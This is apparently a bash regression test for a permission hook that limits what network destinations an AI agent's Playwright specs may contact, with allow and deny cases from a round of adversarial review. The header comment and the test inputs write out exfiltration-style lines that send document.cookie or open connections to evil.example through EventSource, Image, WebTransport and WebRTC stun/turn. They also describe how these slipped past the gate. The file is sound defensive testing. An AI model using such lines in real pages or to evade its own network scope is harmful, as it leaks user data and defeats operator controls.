#!/bin/bash
# 54-reviewer-round50.sh — regressions for round 50 of independent
# adversarial review.
#
# Round 50 traced BOTH of its findings to one branch the kernel never
# modernised, and that is the whole lesson: **a substring match is wrong
# in both directions at once.**
#
# Round 38 taught the NAVIGATION sinks to parse the call and check the
# destination. `fetch`, `WebSocket` and `XMLHttpRequest` kept a naive
# substring match in the blanket capability branch. Against the bench
# composer's REAL grants (network.allow: ["localhost:4173"]):
#
#   ESCAPE — inside page.evaluate, every one ALLOW:
#     new EventSource("http://evil:1/?d=" + document.cookie)
#     new Image().src = "http://evil:1/e"
#     new WebTransport("https://evil:1/e")
#     new RTCPeerConnection({iceServers:[{urls:"stun:evil:1"}]})
#
#   FALSE POSITIVE — every one DENY:
#     page.evaluate(() => fetch("/api"))                      same-origin
#     page.evaluate(() => fetch("http://localhost:4173/api")) IN SCOPE
#     expect(page.getByText("Click to fetch (beta)"))         UI TEXT
#
# The role could not assert on a button label containing `fetch(`, and
# could dial anywhere it liked through a constructor. And the only
# escape from the false positive was `codeCapabilities: ["network"]` — a
# destination-BLIND grant that discards the `network.allow` the operator
# wrote. The narrow correct thing refused; the broad wrong thing the
# remedy.
#
# Enumerating the browser's ways to dial out is what round 48 already
# ruled against for Chromium's switches. So the question is asked about
# the DESTINATION and never about the sink: an absolute network URL
# written as a whole string literal is held to the role's network scope,
# whatever API receives it — including APIs that do not exist yet.

H="$HOOK_DIR/kernel-mandate-role-gate.sh"

section "kernel-mandate reviewer round-50 regressions"

R50=$(mktemp -d)
P="$R50/proj"
mkdir -p "$P/.claude" "$P/tests/e2e"
export KERNEL_MANDATE_STATE_DIR="$R50/state"
export KERNEL_MANDATE_MANIFEST="$P/.claude/kernel-mandate.json"
mkdir -p "$KERNEL_MANDATE_STATE_DIR/agents"

cat > "$P/.claude/kernel-mandate.json" <<'JSON'
{
  "kernelMandateVersion": 1,
  "name": "r50",
  "settings": { "mainSessionRole": "composer" },
  "commandGroups": { "t": ["^npx playwright test\\b"] },
  "roles": {
    "composer": {
      "description": "Authors specs against the app under test and runs them.",
      "tools": { "allow": ["Bash", "Read", "Write"] },
      "bash": { "groups": ["t"] },
      "read": { "allow": ["tests/**"] },
      "network": { "allow": ["localhost:4173"] },
      "write": { "allow": ["tests/e2e/**"], "codeImports": ["@playwright/test"] }
    },
    "unscoped": {
      "description": "Authors specs and declares no network scope at all.",
      "tools": { "allow": ["Write"] },
      "read": { "allow": ["tests/**"] },
      "write": { "allow": ["tests/e2e/**"], "codeImports": ["@playwright/test"] }
    }
  }
}
JSON
printf 'composer\n' > "$KERNEL_MANDATE_STATE_DIR/agents/c"
printf 'unscoped\n' > "$KERNEL_MANDATE_STATE_DIR/agents/u"

PW='import { test, expect } from "@playwright/test";'
spec() { "$JQ" -nc --arg c "$PW
$1" --arg a "${2:-c}" \
  '{tool_name:"Write",tool_input:{file_path:"tests/e2e/x.spec.ts",content:$c},cwd:"'"$P"'",agent_id:$a}'; }
evalbody() { spec "test(\"x\", async ({ page }) => { await page.evaluate(() => { $1; }); });" "${2:-c}"; }

# --- The escape: a destination is a destination, whatever dials it -----
assert_deny "$H" "$(evalbody 'new EventSource("http://evil.example:1/e")')" \
  "R50 EventSource, a constructor no sink list named → DENY" "network scope"
assert_deny "$H" "$(evalbody 'new Image().src = "http://evil.example:1/e"')" \
  "R50 an Image src assignment → DENY" "network scope"
assert_deny "$H" "$(evalbody 'new WebTransport("https://evil.example:1/e")')" \
  "R50 WebTransport → DENY" "network scope"
# WebRTC's ICE servers are spelled `stun:host:port` — no `//` at all, so
# the shared URL test walked straight past a live dial-out.
assert_deny "$H" "$(evalbody 'new RTCPeerConnection({iceServers:[{urls:"stun:evil.example:1"}]})')" \
  "R50 WebRTC stun:, a URL with no '//' in it → DENY" "network scope"
assert_deny "$H" "$(evalbody 'new RTCPeerConnection({iceServers:[{urls:"turn:evil.example:3478"}]})')" \
  "R50 ...and turn: → DENY" "network scope"
assert_deny "$H" "$(evalbody 'fetch(" http://evil.example/x".trim())')" \
  "R50 a leading space inside the literal is still a destination → DENY" "network scope"
assert_deny "$H" "$(evalbody 'fetch("http://evil.example/x")')" \
  "R50 calibration: plain off-scope fetch → DENY" "network scope"
assert_deny "$H" "$(evalbody 'fetch("http://localhost:4173/api")' u)" \
  "R50 a role with NO network scope cannot show any destination permitted → DENY" "no network scope"

# --- The false positives, which cost as much ---------------------------
assert_allow "$H" "$(evalbody 'fetch("/api")')" \
  "R50 a relative, same-origin fetch reaches only the app → ALLOW"
assert_allow "$H" "$(evalbody 'fetch("http://localhost:4173/api")')" \
  "R50 a fetch at the IN-SCOPE host → ALLOW"
assert_allow "$H" "$(evalbody 'new WebSocket("ws://localhost:4173/live")')" \
  "R50 an in-scope WebSocket → ALLOW"
assert_allow "$H" "$(spec 'test("t", async ({ page }) => { await expect(page.getByText("Click to fetch (beta)")).toBeVisible(); });')" \
  "R50 the STRING 'fetch (' in a button label is not a capability → ALLOW"
assert_allow "$H" "$(spec 'test("t", async ({ page }) => { await page.getByLabel("q").fill("fetch(all)"); });')" \
  "R50 ...nor typed into an input → ALLOW"

# --- A URL that is DOCUMENTATION, not a destination --------------------
# The URL must be the WHOLE literal. A string that IS a URL is a
# destination; a URL inside prose is a link, and refusing those would be
# the same false positive one layer along.
assert_allow "$H" "$(spec 'test("regression for https://tracker.example/BUG-1", async ({ page }) => { await page.goto("/forms"); });')" \
  "R50 a tracker link inside a test TITLE → ALLOW"
assert_allow "$H" "$(spec '// see https://tracker.example/BUG-1 for context
test("t", async ({ page }) => { await page.goto("/forms"); });')" \
  "R50 ...and in a comment → ALLOW"
assert_allow "$H" "$(spec 'test("t", async ({ page }) => { await page.goto("http://localhost:4173/forms"); });')" \
  "R50 calibration: navigating to the app under test → ALLOW"
assert_deny "$H" "$(spec 'test("t", async ({ page }) => { await page.goto("http://evil.example/"); });')" \
  "R50 calibration: navigating off-scope, as round 38 → DENY" "navigation"

unset KERNEL_MANDATE_STATE_DIR KERNEL_MANDATE_MANIFEST
rm -rf "$R50"
